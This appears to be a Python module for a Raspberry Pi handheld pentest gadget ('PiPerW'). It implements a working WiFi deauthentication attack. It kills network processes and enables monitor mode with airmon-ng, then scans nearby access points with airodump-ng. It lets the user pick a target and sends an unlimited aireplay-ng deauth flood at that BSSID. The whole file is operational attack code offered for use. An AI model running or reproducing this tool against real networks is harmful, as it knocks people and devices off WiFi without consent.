from PiPerW.interfaces.app_interface import AppInterface
from PiPerW.driver.pheripherals import Pheripherals
from PiPerW.driver.display import Display
from PiPerW.helpers import Log, Config
from PiPerW.utils.Menu import Menu
import os, time, subprocess
import csv
import shutil
import glob

display = Display()
pheripherals = Pheripherals()

class App(AppInterface):

    def __init__(self):
        super().__init__()
        self.menu = None
        self.ap = []
        self.mon_interface = Config['network']['interface'] + "mon"

    def init(self):
        self.screen_and_log("Initializing \nWiFi Deauth","w")
        time.sleep(1)

        # clear tmp files
        for f in glob.glob("PiPerW/tmp/scan*"):
            try:
                os.remove(f)
            except OSError:
                pass


        self.screen_and_log("Killing config\nprocesses")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)

        self.screen_and_log(f"Enabling Monitor\nMode on\n{Config['network']['interface']}")
        # Try finding if interface is already mon
        iwconfig_res = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if "Monitor" in iwconfig_res.stdout and self.mon_interface in iwconfig_res.stdout:
            Log.info("Monitor already enabled")
        else:
            subprocess.run(["sudo", "airmon-ng", "start", Config['network']['interface']], capture_output=True)
            time.sleep(2)
        
        # Verify the actual monitor interface created
        iwconfig_res = subprocess.run(["iwconfig"], capture_output=True, text=True)
        actual_mon = None
        for line in iwconfig_res.stdout.split('\n'):
            if "Monitor" in line or "Mode:Monitor" in line:
                # the line above usually has the interface or it's the same line
                pass
        
        # simple check
        if self.mon_interface not in iwconfig_res.stdout:
            # fallback: maybe it didn't rename it
            if Config['network']['interface'] in iwconfig_res.stdout and "Monitor" in iwconfig_res.stdout:
                self.mon_interface = Config['network']['interface']
            else:
                self.screen_and_log("Monitor mode err\nContinue anyway?", "e")
                time.sleep(1)
                from PiPerW.utils.Menu import Menu
                menu = Menu(["Exit", "Continue"])
                cont = False
                while not self.is_stopped():
                    menu.show()
                    k = pheripherals.await_key()
                    if k is None or self.is_stopped() or k in ["back", "exit"]: return
                    if k == "up": menu.previous()
                    elif k == "down": menu.next()
                    elif k == "select":
                        if menu.index == 1:
                            cont = True
                        break
                if not cont:
                    return

        self.screen_and_log("Scanning...\n\n[Press any key \nto stop]")

        scan = subprocess.Popen(["sudo", "airodump-ng", self.mon_interface, "--output-format", "csv", "-w", "PiPerW/tmp/scan"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        self.wait_for_input()

        self.screen_and_log("Stopping scan")
        scan.terminate()
        subprocess.run(["sudo", "killall", "airodump-ng"], capture_output=True)
        time.sleep(1)

        csv_file = 'PiPerW/tmp/scan-01.csv'
        if not os.path.exists(csv_file):
            self.screen_and_log("No networks\nfound.\n\n[Press any key]")
            self.wait_for_input()
            return

        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as csvfile:
            reader = csv.DictReader(csvfile, fieldnames)
            for row in reader:
                if row['BSSID'] == "BSSID":
                    continue
                elif row['BSSID'] == "Station MAC":
                    break
                else:
                    try:
                        bssid = row.get('BSSID', '').strip()
                        ssid = row.get('ESSID', '').strip()
                        if bssid and bssid not in [a['BSSID'] for a in self.ap]:
                            self.ap.append(row)
                    except (KeyError, AttributeError):
                        pass

        if not self.ap:
            self.screen_and_log("No APs found.\n\n[Press any key]")
            self.wait_for_input()
            return

        bssid_list = []
        for i in self.ap:
            name = (i.get('ESSID', '').strip() or "<Hidden>")[:10]
            bssid_list.append(f"{name} {i['BSSID']}")

        bssid_list.append("Exit")
        selector = Menu(bssid_list, "Select AP:")

        display.clear()
        selector.show()
        while not self.is_stopped():
            key = self.wait_for_input()
            if key == "up":
                selector.previous()
                selector.show()
            elif key == "down":
                selector.next()
                selector.show()
            elif key == "select":
                break
            elif key == "back":
                return

        idx = selector.index
        if idx == len(bssid_list) -1:
            return

        target_ap = self.ap[idx]
        bssid_mac = target_ap['BSSID']
        channel = target_ap['channel'].strip()

        self.screen_and_log(f"Setting Ch {channel}")
        subprocess.run(["sudo", "iwconfig", self.mon_interface, "channel", channel], capture_output=True)
        
        self.screen_and_log(f"Deauthing:\n{bssid_mac}\n\n[Press BACK \nto stop]")
        deauth = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid_mac, self.mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        while not self.is_stopped():
            key = self.wait_for_input()
            if key == "back" or self.is_stopped():
                self.screen_and_log("Stopping deauth")
                deauth.terminate()
                subprocess.run(["sudo", "killall", "aireplay-ng"], capture_output=True)
                break

    def screen_and_log(self, message, type="i"):
        if type == "i":
            Log.info(message.replace('\n',' '))
        elif type == "w":
            Log.warning(message.replace('\n',' '))
        elif type == "e":
            Log.error(message.replace('\n',' '))
        display.text(message)

    def run(self):
        self.init()
